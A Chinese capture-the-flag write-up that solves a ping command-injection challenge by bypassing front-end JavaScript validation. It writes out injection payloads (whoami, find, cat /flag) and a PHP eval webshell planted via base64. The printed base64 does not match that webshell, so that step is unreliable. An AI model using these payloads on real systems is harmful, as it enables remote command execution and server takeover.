- **一题多解思考**
![image](https://github.com/user-attachments/assets/03797ba0-f8fa-42f6-8182-ea9f499873e0)
> 看题目

![image](https://github.com/user-attachments/assets/6b58c0e7-1480-43c2-b377-783947e75e52)
### 尝试随便ping一个值
> [!TIP]
比如本地回环地址127.0.01

![image](https://github.com/user-attachments/assets/99d51359-2c5f-4baa-a7ea-8c8bd542d6a1)
> 果然不行呢，有验证，查了一下资料叫做前端验证

![image](https://github.com/user-attachments/assets/64529f4f-94f7-470b-a2b3-27d6ccb49983)
> [!TIP]
采用的是JavaScript的方式：

### **JavaScript功能**
**IP地址验证**：`check_ip()` 函数用于验证用户输入的IP地址是否符合IPv4格式。它使用正则表达式 `/^(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)$/` 来匹配有效的IPv4地址。如果输入的IP地址不符合格式，函数会弹出警告并返回`false`，阻止表单提交。
所以可以考虑禁用JavaScript
### 思路一
> [!NOTE]
禁用JavaScript

![image](https://github.com/user-attachments/assets/749ec554-4084-4ae2-9060-b203fb04f239)
![image](https://github.com/user-attachments/assets/48efa4f3-1d5b-401b-9658-6bc89a92812d)
然后再输入刚刚尝试的地址
得到这个，？**好像没啥用**
![image](https://github.com/user-attachments/assets/105b16f2-bfe9-460a-8d7a-5b549971ead0)
查看一下文件
> **输入127.0.01||ls/**

![image](https://github.com/user-attachments/assets/a6a148ed-6b5a-4e6f-a3a7-e23220e51b59)
出来了
> `flag=NSSCTF{cae6837d-0912-4b2b-bbd8-0ed6e1695c9e}`
![image](https://github.com/user-attachments/assets/24d92330-4d28-413a-9b81-d7bd32677dd4)
### 思路二
> [!TIP]
使用hackbar发包

不知道怎么回事我的浏览器的hackbar安装的问题
审计源码
```
<form action="" method="posT" onsubmit="return check_ip()">
<input id="command" name="command" type="text" placeholder="Enter an IP address"/>
<input name="ping" type="submit" value="Ping"/>
</form>
```
> [!NOTE]
同样是发送comment=127.0.01||ls/(**当然我的插件出问题了就没有演示，图片上使用的1.1.1.1也可以**)
然后发现flag
再发送comment=127.0.01||cat/flag来读取flag的值
### 思路三
这个本来放在思路四的，排版排上来了，这个有点没明白
> [!TIP]
**Hook技术绕过前端验证**
使用JavaScript Hook
javascript
```
check_ip = function(){}
```
**Hook `check_ip` 函数**：通过在浏览器的开发者工具（如Chrome的控制台）中重新定义 `check_ip` 函数，将其替换为一个空函数。这样，无论用户输入什么内容，`check_ip` 函数都会返回 `true`，从而绕过前端的IP地址验证。
![image](https://github.com/user-attachments/assets/908dcaa0-3ba6-4851-a04b-85d1a5b2c4d6)
### 思路四
学习师傅的思路
> [!TIP]
采用burpsuite抓包

#### **命令注入攻击**

- **原始请求**：假设原始请求中有一个参数 `command`，其值为 `127.0.0.1`，表示要执行的命令。
- **修改请求**：攻击者通过BurpSuite修改请求，将 `command` 参数的值改为 `127.0.0.1|whoami`，这里的 `|` 是管道符，用于将前一个命令的输出作为后一个命令的输入。
- **执行命令**：后端接收到修改后的请求后，会执行 `127.0.0.1|whoami`，其中 `whoami` 是一个Linux命令，用于显示当前用户的用户名。
- **返回结果**：后端返回执行结果 `www-data`，表示当前用户是 `www-data`。

#### **进一步利用**

- **查找文件**：攻击者继续修改请求，将 `command` 参数的值改为 `127.0.0.x||find / -name flag*`，这里的 `||` 表示如果前一个命令失败，则执行后一个命令。`find / -name flag*` 用于在根目录下查找文件名以 `flag` 开头的文件。
- **返回结果**：后端返回 `/flag`，表示找到了一个名为 `flag` 的文件。
- **读取文件**：攻击者再次修改请求，将 `command` 参数的值改为 `127.0.0.x||cat /flag`，这里的 `cat /flag` 用于读取 `flag` 文件的内容。
- **返回结果**：后端返回 `flag=NSSCTF(e3c1168b-4204-4875-a84b-bacdca94b744)`，表示成功读取了 `flag` 文件的内容。

#### **写入WebShell**

- **WebShell**：WebShell 是一种恶意脚本，通常以PHP、ASP等语言编写，允许攻击者在目标服务器上执行任意命令。
- **编码WebShell**：攻击者编写了一个简单的PHP WebShell，内容为 `<?php eval($_POST[cc]);?>`，并将其Base64编码为 `PD9waiMgZXZhbcgkXIBPUIRbYZNdkTs/Pg==`。
- **写入文件**：攻击者通过修改请求，将 `command` 参数的值改为 `127.0.0.x||echo "PD9waiMgZXZhbcgkXIBPUIRbYZNdkTs/Pg==" | base64 -d >cc.php`，这里的 `echo ... | base64 -d >cc.php` 用于将Base64编码的内容解码并写入 `cc.php` 文件。
- **成功写入**：后端执行命令后，成功将WebShell写入 `cc.php` 文件，攻击者现在可以通过访问 `cc.php` 并发送POST请求来执行任意PHP代码。

## 总结

- 考点：前端禁用&命令执行
  本题目是经典PING命令RCE题目，采用前端验证的方法阻止危险命令，所以解法也很多样。
- 学会了使用多种工具来辅助自己绕过前段验证









